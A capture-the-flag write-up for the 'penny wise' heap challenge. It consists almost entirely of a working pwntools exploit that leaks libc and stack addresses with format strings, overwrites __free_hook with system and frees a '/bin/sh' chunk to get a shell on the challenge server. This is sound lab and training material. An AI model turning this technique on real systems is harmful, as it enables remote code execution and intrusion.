@@ -1,0 +1,227 @@
+# penny wise
+
+Disclaimer: Solved after the competition.
+
+## Description
+
+Thou shalt not extremely waste memory!
+
+N.B. In case you’re wondering libc is 2.27.
+
+## Challenge
+
+Heap stuff
+
+## Intended solution
+
+Go read [Daniele Pusceddu's writeup](https://danielepusceddu.github.io/ctf_writeups/volgaqualifiers21_pennywise/).
+
+## Solution
+
+Format string FTW...
+
+## Exploit
+
+```py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ template template --host 139.162.160.184 --port 19999 bin
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('bin')
+libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
+ld = ELF("./ld-2.27.so")
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or '139.162.160.184'
+port = int(args.PORT or 19999)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    p = process([ld.path, exe.path] + argv, *a, **kw, env={"LD_PRELOAD": libc.path})
+    if args.GDB:
+        gdb.attach(p, gdbscript=gdbscript)
+    return p
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+context.terminal = ['tmux', 'splitw', '-v']
+gdbscript = '''
+b*0x7ffff7bcfd95
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+
+
+def Store(title, content):
+    io.sendlineafter('[Q]uit\n', 'S')
+    io.sendlineafter('title\n', title)
+    io.sendlineafter('content\n', content)
+
+def Return(title):
+    io.sendlineafter('[Q]uit\n', 'R')
+    io.sendlineafter('title\n', title)
+
+def Update(title, content):
+    io.sendlineafter('[Q]uit\n', 'U')
+    io.sendlineafter('title\n', title)
+    io.sendlineafter('content\n', content)
+
+def Delete(title):
+    io.sendlineafter('[Q]uit\n', 'D')
+    io.sendlineafter('title\n', title)
+
+def buildStackAddr(offset, word):
+    lsw = (stackaddr + 8 + offset) % 0x10000
+    written = 0
+    fmtstr = ''
+
+    fmtstr += '%2hhx' * 14
+    written += 14*2
+    fmtstr += '%' + str((lsw - written) % 0x10000 + 0x10000) + 'hhx'
+    written += (lsw - written) % 0x10000
+    fmtstr += '%hn'
+
+    fmtstr += '%2hhx' * 4
+    written += 4*2
+    fmtstr += '%' + str((word - written) % 0x10000 + 0x10000) + 'hhx'
+    written += (word - written) % 0x10000
+    fmtstr += '%hn'
+
+    #proof of concept: reset stack to original state
+    '''
+    fmtstr += '%' + str((0x69 - written) % 0x10000 + 0x10000) + 'hhx'
+    written += (0x69 - written) % 0x10000
+    fmtstr += '%16$hn'
+    '''
+
+    Update('writer', fmtstr)
+    Return('writer')
+
+    io.success("wrote stack word: " + hex(word) + " to offset: " + hex(offset))
+
+io = start()
+pause()
+
+
+
+Store('leaklib', '%45$p aaaaaaaa')
+Return('leaklib')
+
+leaklib = io.recvline().decode().split(' ')[0]
+libc.address = int(leaklib, 0) - 0x021bf7
+io.success("Libc address: " + hex(libc.address))
+
+
+
+Store('leakstk', '%22$p aaaaaaaa')
+Return('leakstk')
+
+leakstk = io.recvline().decode().split(' ')[0]
+stackaddr = int(leakstk, 0)
+io.success("Stack address: " + hex(stackaddr))
+
+Store("writer", "paaaaaaaaaaaaaad")
+
+
+
+freeHook = libc.sym['__free_hook']
+io.success("free hook at: " + hex(freeHook))
+freeHook0 = libc.sym['__free_hook'] % 0x10000
+freeHook2 = (libc.sym['__free_hook'] // 0x10000) % 0x10000
+freeHook4 = (libc.sym['__free_hook'] // 0x100000000) % 0x10000
+freeHook6 = (libc.sym['__free_hook'] // 0x1000000000000) % 0x10000
+
+buildStackAddr(0, freeHook0)
+buildStackAddr(2, freeHook2)
+buildStackAddr(4, freeHook4)
+buildStackAddr(6, freeHook6)
+
+buildStackAddr(8, freeHook0 + 2)
+buildStackAddr(10, freeHook2)
+buildStackAddr(12, freeHook4)
+buildStackAddr(14, freeHook6)
+
+buildStackAddr(16, freeHook0 + 4)
+buildStackAddr(18, freeHook2)
+buildStackAddr(20, freeHook4)
+buildStackAddr(22, freeHook6)
+
+buildStackAddr(24, freeHook0 + 6)
+buildStackAddr(26, freeHook2)
+buildStackAddr(28, freeHook4)
+buildStackAddr(30, freeHook6)
+
+
+
+system = libc.sym["system"]
+io.success("system at: " + hex(system))
+
+system0 = system % 0x10000
+system2 = (system // 0x10000) % 0x10000
+system4 = (system // 0x100000000) % 0x10000
+system6 = (system // 0x1000000000000) % 0x10000
+
+written = 0
+fmtstr = ''
+
+Store('shell', '//bin/sh\x00')
+
+if(system0 > 0):
+    fmtstr += '%' + str((system0 - written) % 0x10000) + 'hhx'
+    written += (system0 - written) % 0x10000
+    fmtstr += '%45$hn'
+
+if(system2 > 0):
+    fmtstr += '%' + str((system2 - written) % 0x10000) + 'hhx'
+    written += (system2 - written) % 0x10000
+    fmtstr += '%46$hn'
+
+if(system4 > 0):
+    fmtstr += '%' + str((system4 - written) % 0x10000) + 'hhx'
+    written += (system4 - written) % 0x10000
+    fmtstr += '%47$hn'
+
+if(system6 > 0):
+    fmtstr += '%' + str((system6 - written) % 0x10000) + 'hhx'
+    written += (system6 - written) % 0x10000
+    fmtstr += '%48$hn'
+
+Update('writer', fmtstr)
+Return('writer')
+
+
+
+Delete('shell')
+
+io.interactive()
+```
+
